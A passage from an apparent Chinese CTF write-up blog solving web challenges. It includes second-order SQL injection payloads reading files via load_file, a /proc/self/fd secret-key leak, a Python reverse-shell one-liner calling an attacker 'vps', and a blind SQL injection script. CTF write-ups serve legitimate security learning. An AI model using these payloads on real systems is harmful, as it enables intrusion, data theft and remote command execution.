class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$user_name</span>.<span class="string">&quot;已提交订单&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$user_name</span>, <span class="variable">$address</span>, <span class="variable">$phone</span>);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单提交成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>这里注意到<code>confirm</code>中对<code>address</code>参数是没有过滤的</strong>, 这里后续的操作是将用户提交的<code>user_name</code>, <code>address</code>, <code>phone</code>加入到数据表中(23行)</p><p>在<code>change</code>的21行, 执行更新<code>address</code>功能时会从表中查询之前存进去的<code>address</code>,也就是 <code>old_address</code>&#x3D;<code>$row[&#39;address&#39;]</code></p><p>那么如果我们在<code>confirm</code>中将payload提交到不经过滤的<code>address</code>中, 然后让它存进表里</p><p>在<code>change</code>中就可能会出现报错</p><p>使用报错注入: 这里先将参数提交给<code>confirm.php</code>,然后去<code>change</code>中,输入同样的用户名和密码,触发查询,查看报错信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user_name=qqq&amp;phone=111&amp;address=3&#x27;&amp;&amp;extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">user_name=qq&amp;phone=11&amp;address=&#x27; and extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">访问change.php输入前面的name和phone后, 输出:errorXPATH syntax error: &#x27;~ctfusers~&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_name=xc&amp;phone=234&amp;address=&#x27; and extractvalue(1,concat(0x7e,(select load_file(&#x27;/flag.txt&#x27;)),0x7e))#</span><br><span class="line">访问change.php输入前面的name和phone后,输出:errorXPATH syntax error: &#x27;~flag&#123;e62bb712-dc5d-4f48-bd21-87&#x27;</span><br><span class="line"></span><br><span class="line">user_name=xccc&amp;phone=2344&amp;address=&#x27; and extractvalue(1,concat(0x7e,(select replace((select load_file(&#x27;/flag.txt&#x27;)),&quot;e62bb712-dc5d-4f48-bd21-87&quot;,&quot;&quot;)),0x7e))#</span><br><span class="line">访问change.php输入前面的name和phone后输出: flag&#123;58112d0ecf&#125;</span><br><span class="line">那么拼接成最后的flag:</span><br><span class="line">flag&#123;e62bb712-dc5d-4f48-bd21-8758112d0ecf&#125;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="proc-python反弹shell-PicDown"><a href="#proc-python反弹shell-PicDown" class="headerlink" title="[proc,python反弹shell]PicDown"></a>[proc,python反弹shell]PicDown</h1><p>就给了一个输入框,根据参数名的话这里是让输入url</p><p>这里输入以下百度,能够直接下载网页源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=http://www.baidu.com</span><br></pre></td></tr></table></figure><p>接着尝试使用<code>http://</code>或<code>file://</code>读取本地文件, 都没有成功, 但是这里直接输入文件名竟然能下载:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">page?url=/etc/passwd</span><br><span class="line">page?url=/flag</span><br></pre></td></tr></table></figure><p>这里直接把flag下载下来了…</p><p>后来看wp,可能是buu这里的环境有点问题,正常的流程应该是:</p><p>读取<code>/proc/self/cmdline</code>,获取启动当前环境的完整命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=/proc/self/cmdline</span><br><span class="line">url=../../../../../../proc/self/cmdline</span><br><span class="line">内容:</span><br><span class="line">python2 app.py </span><br></pre></td></tr></table></figure><p>读取<code>app.py</code>:  <code>page?url=app.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip() <span class="comment"># strip移除前后的空白字符</span></span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>): <span class="comment"># 这里url不能为file开头,这也解释了为什么一开始用file://不管用</span></span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>程序开始运行时,会从<code>/tmp/secret.txt</code>获取一个<code>SECRET_KEY</code>值, 然后将该文件删除</p><p>访问<code>/no_one_know_the_manager</code>这个路由时, 会让我们输入一个<code>key</code>如果等于<code>SECRET_KEY</code>,就可以执行我们输入的命令</p><p>现在问题就是如何获取这个<code>SECRET_KEY</code></p><blockquote><p><strong>但在 linux 系统中如果一个程序用<code>open()</code>打开了一个文件但最终没有关闭他，即便从外部（例如如<code>os.remove(SECRET_FILE)</code>）删除这个文件之后，在 <code>/proc</code> 这个进程的 <code>pid</code> 目录下的 <code>fd</code> 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容</strong>。<code>/proc/[pid]/fd</code> 这个目录里包含了进程打开文件的情况，目录里面有一堆<code>/proc/[pid]/fd/id</code>文件</p><p><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>对于当前运行的程序本身,我们通过<code>self</code>就能够取到其本身的<code>pid</code>,那么接下来就可以通过爆破<code>id</code>来获取我们需要的文件描述符<code>/proc/self/fd/[id]</code></span></p><p>当一个新进程建立时，此进程将默认有 0，1，2 的文件描述符,分别代表标准输入,标准输出,标准错误输出</p><p>那么当打开一个新文件时,文件描述符会从3开始</p></blockquote><p>这里直接试了一下,<code>id=3</code>即找到了该文件并下载, 得到<code>SECRET_KEY</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">page?url=/proc/self/fd/3</span><br><span class="line">vv4RKbyjTqO/VtyoIAkBGyKrzDp27GbPQc0Ur1hCfbw=</span><br></pre></td></tr></table></figure><p>能够通过检测:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=vv4RKbyjTqO/VtyoIAkBGyKrzDp27GbPQc0Ur1hCfbw=&amp;shell=ls</span><br></pre></td></tr></table></figure><p>但是这里并不会回显命令执行的结果</p><p>这里需要使用<code>python</code>反弹获得shell, 这里让目标执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;监听主机的ip&#x27;,监听主机的端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><p>这里的代码为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os,socket</span><br><span class="line">subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&#x27;监听主机的ip&#x27;,监听主机的端口))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])</span><br></pre></td></tr></table></figure><p>然后在我们能够控制的监听主机上使用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 端口号 </span><br></pre></td></tr></table></figure><p>开启监听, 就能够获得目标主机的<code>shell</code>了</p><p>payload: (这里还需要将下面的shell中的值url编码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=JLAwm2xCtqkgNGJTHgPPocxTSLbWX4q7FVxQDxFCi/w=&amp;shell=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;vps&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="bak泄露-盲注-踩坑多-php短标签上传-Easyweb"><a href="#bak泄露-盲注-踩坑多-php短标签上传-Easyweb" class="headerlink" title="[bak泄露,盲注(踩坑多),php短标签上传]Easyweb"></a>[bak泄露,盲注(踩坑多),php短标签上传]Easyweb</h1><p><img src="/../images/buuctf-web3/image-20221027155154807.png" alt="image-20221027155154807"></p><p><code>image.php</code>根据<code>id</code>显示不同的图片</p><p>看到输入框,先找了半天注入点…..</p><p>访问<code>robots.txt</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure><p>经过尝试,可以下载<code>image.php.bak</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>); <span class="comment">//给单双引号前面加上反斜杠</span></span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>这里<code>addslashes</code>的作用是给单引号,双引号,反斜杠前面再加一个反斜杠来转义</p><p>而10,11行这里,将<code>\\0</code>等字符替换成了空字符 两者一起使用,就产生了漏洞</p><p>例如如果输入<code>id=\\0</code>, <code>addslashes</code>会将其变成<code>\\\0</code> (这里相当于第一个<code>\</code>将第二个<code>\</code>转义为了一般字符)</p><p>然后<code>str_replace</code>又删除了<code>\\0</code>,那么id最后还剩下一个<code>\</code></p><p>可以在本地验证一下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27; or 1=1 %23&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>); <span class="comment">//给单双引号前面加上反斜杠</span></span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$id</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$path</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$query</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\</span><br><span class="line">or 1=1 %23</span><br><span class="line">select * from images where id=&#x27;\&#x27; or path=&#x27; or 1=1 %23&#x27;</span><br></pre></td></tr></table></figure><p>所以当<code>id=\\0</code>,<code>path= or 1=1 %23</code>时  </p><p><code>id</code>后面得那个反斜线将单引号转义, <code>id</code>前面得那个单引号不得不和<code>path</code>后面的单引号配对, 整个语句变成了:</p><p><code>id</code> &#x3D;  <code>\&#39; or path=</code></p><p><code>or</code></p><p><code>1=1</code></p><p>这种形式,也就有了通过逻辑进行注入的可能性</p><p>测试一下库名的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=\\0&amp;path= or (length(database())=10) %23    成功显示了图片,说明长度为1</span><br></pre></td></tr></table></figure><p>爆库名: <code>ciscnfinal</code></p><p>爆表名:<code>images,users</code></p><p>爆列名: <code>username,password</code></p><p>密码: <code>ae6191ca06c72dfb42aa</code></p><p>脚本:</p><p>注意,这里踩了好久的坑…    这里查询语句里好像不能使用引号包裹特殊字段,否则会已知导致整个语句的值为0或1</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;path&quot;:&quot; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= &#x27;users&#x27; and table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span><br><span class="line">这里users使用了引号, 导致脚本已知跑不出来</span><br><span class="line">所以把这里的users转换成16进制</span><br><span class="line">&quot;path&quot;:&quot; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 0x7573657273 and table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span><br><span class="line">另外,在对substr取出的字符进行比对时,为了避免使用引号, 也将其转化为ascii码值再比较</span><br></pre></td></tr></table></figure><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chars = string.printable[:]  <span class="comment">#返回所有可打印的字母，数字，符号的集合</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">base_url = <span class="string">&quot;http://b9f4d0a2-000c-4afa-bc53-2eaf797667e9.node4.buuoj.cn:81/image.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>(<span class="params">length</span>):</span><br><span class="line">    database_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; length+<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot; or (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;) #&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#print(params[&#x27;path&#x27;])</span></span><br><span class="line">            <span class="comment">#print(base_url)</span></span><br><span class="line">            res = session.get(base_url, params=params).text</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">117007</span> :</span><br><span class="line">                database_name += c</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(params[&#x27;path&#x27;])</span></span><br><span class="line">            <span class="comment"># print(base_url)</span></span><br><span class="line">            <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">            res = 